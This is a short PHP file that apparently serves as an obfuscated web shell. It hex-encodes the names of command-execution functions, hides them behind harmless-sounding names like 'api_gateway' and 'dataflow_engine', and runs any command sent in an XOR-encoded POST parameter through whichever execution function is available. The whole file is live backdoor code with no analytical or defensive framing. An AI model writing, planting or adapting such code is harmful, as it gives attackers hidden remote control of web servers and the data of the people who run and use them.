<?php

$api_gateway1 = "sy\x73\x74\x65m";
$restore_state = "h\x65\x782b\x69\x6E";
$api_gateway2 = "\x73h\x65ll\x5F\x65\x78ec";
$api_gateway5 = "\x70ope\x6E";
$api_gateway3 = "\x65xe\x63";
$api_gateway7 = "p\x63\x6C\x6Fse";
$api_gateway4 = "\x70a\x73\x73th\x72u";
$api_gateway6 = "s\x74rea\x6D_get_\x63\x6Fn\x74e\x6Et\x73";
if (isset($_POST["en\x74"])) {
            function dataflow_engine( $object, $obj){ $ptr = '';$f=0; while($f<strlen($object)){$ptr.=chr(ord($object[$f])^$obj);$f++;} return$ptr; }
            $ent = $restore_state($_POST["en\x74"]);
            $ent = dataflow_engine($ent, 84);
            if (function_exists($api_gateway1)) {
                $api_gateway1($ent);
            } elseif (function_exists($api_gateway2)) {
                print $api_gateway2($ent);
            } elseif (function_exists($api_gateway3)) {
                $api_gateway3($ent, $property_set_object);
                print join("\n", $property_set_object);
            } elseif (function_exists($api_gateway4)) {
                $api_gateway4($ent);
            } elseif (function_exists($api_gateway5) && function_exists($api_gateway6) && function_exists($api_gateway7)) {
                $obj_ptr = $api_gateway5($ent, 'r');
                if ($obj_ptr) {
                    $data_chunk_elem = $api_gateway6($obj_ptr);
                    $api_gateway7($obj_ptr);
                    print $data_chunk_elem;
                }
            }
            exit;
        }